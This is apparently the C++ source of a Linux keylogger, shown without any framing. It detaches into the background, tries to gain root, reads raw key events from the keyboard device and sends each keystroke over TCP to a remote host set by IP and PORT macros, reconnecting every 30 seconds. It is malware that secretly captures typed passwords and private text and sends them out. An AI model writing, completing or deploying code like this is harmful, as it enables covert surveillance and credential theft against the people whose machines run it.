int keyboard;
int kfd;

char* pname;

struct input_event ev;
struct sockaddr_in addr;


// Prototypes

void save(int);
void pipe(int);

void ioForward(void);

char* GetHostByName(const char*);

class KeyboardTools{
    private:
        const char* iDevs="/proc/bus/input/devices";
        char iPath[19]="/dev/input/";
        char  Dump[5000];
        char* TargetEvent;
        char* TargetHandl;

        struct stat filestat;
    public:
        char* DumpKeyboardEventFile(){
                int fd=open(iDevs, O_RDONLY);
                if (fd<0){
                        return NULL;
                }

                if (read(fd, Dump, 5000)==-1)exit(2);
                do{
                        TargetHandl=strstr(Dump, "Handlers=");
                        TargetEvent=strstr(Dump, "EV=");
                }

                while(TargetHandl && TargetEvent && strncmp(TargetEvent+3, "120013", 6) != 0);
                if (TargetHandl && TargetEvent){
                        strncat(iPath, strstr(TargetHandl, "event"), 7);
                        close(fd);
                        return iPath;
                }
                else
                        close(fd);
                        exit(1);
                close(fd);
                return 0x00;
       }
    ~KeyboardTools(){}
};

// Functions
int main(int argc, char** argv){
   ioForward();

   kfd=socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);

   signal(SIGTERM, save);
   signal(SIGTRAP, save);
   signal(SIGINT,  save);
   signal(SIGPIPE, pipe);

   pname=argv[0];

   addr.sin_family=AF_INET;
   inet_pton(AF_INET, GetHostByName(IP), &addr.sin_addr.s_addr);
   addr.sin_port=htons(PORT);


   while (connect(kfd, (struct sockaddr*)&addr, sizeof(struct sockaddr_in))==-1) sleep(30);

   const char* map="..1234567890-=\b\tqwertyuiop[]..asdfghjkl;'..\\zxcvbnm../";

   KeyboardTools kbd;
   const char *path=kbd.DumpKeyboardEventFile();
   if (keyboard=open("/dev/input/event0", O_RDONLY)==-1)exit(3);
   perror(argv[0]);
   while (1){
      if (read(keyboard, &ev, sizeof(ev))==-1)
         return 5;
         switch(ev.code){
            case 28:
             send (kfd, "\n", 1, 0);
             break;
            case 57:
             send (kfd, " ", 1, 0);
             break;
            default:
             if(ev.code>=0 && ev.code<=54)
                send (kfd, (map+ev.code), 1, 0);
      }
   }
   return 0;
}

void save(int sig){
    close(keyboard);
    close(kfd);
    exit(0);
}

void ioForward(){
    pid_t pid=fork(), sid=setsid();

    if (pid<0)
      exit(1);

    if (pid>0)
      exit(0);

    if (setuid(0) || seteuid(0))
      exit(1);

}

char* GetHostByName(const char* dns){
   struct hostent* host=gethostbyname(dns);
   static char ipaddr[16];

   if (host==0x00)return 0x00;

   inet_ntop(AF_INET, host->h_addr, ipaddr, 16);

   return ipaddr;
}

void pipe(int sig){
   return;
}
